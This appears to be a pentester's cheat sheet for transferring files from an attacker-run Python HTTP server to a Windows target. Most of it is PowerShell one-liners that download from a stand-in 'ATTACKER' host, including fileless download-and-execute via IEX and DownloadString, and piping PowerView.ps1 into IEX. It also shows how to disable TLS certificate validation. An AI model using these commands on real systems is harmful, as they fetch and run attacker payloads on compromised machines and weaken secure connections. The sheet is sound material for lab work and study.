- In our Linux machine we can start a http server and make the Windows download directly from our server through port 80 
```bash
# start a http server make sure its on the same directory with the file we want transfer
python3 -m http.server
```

---
## Download Directly to Disk
```powershell
# Old ways
(New-Object Net.WebClient).DownloadFile( 'http://ATTACKER/file', 'C:\Users\Public\file' )
```
```powershell
# A bit modern and standard way
# What it does it download and named that file as file.
# Can change the output name if want
Invoke-WebRequest http://ATTACKER/file -OutFile file

# Invoke-WebRequest got another aliases you can use instead that
iwr http://ATTACKER/file -OutFile file
curl http://ATTACKER/file -OutFile file
wget http://ATTACKER/file -OutFile file
```

---

## Fileless Download Method
- The way fileless work, we use some OS function to download the payload and execute it directly

```powershell
IEX (New-Object Net.WebClient).DownloadString( 'http://ATTACKER/script.ps1' )
```

---

## Common Error with PowerShell

```powershell
# Internet Explorer's first-launch configuration is not complete
# Just add the parameter -UseBasicParsing
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# Could not establish trust relationship for the SSL/TLS secure channel
# Run the following command
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---




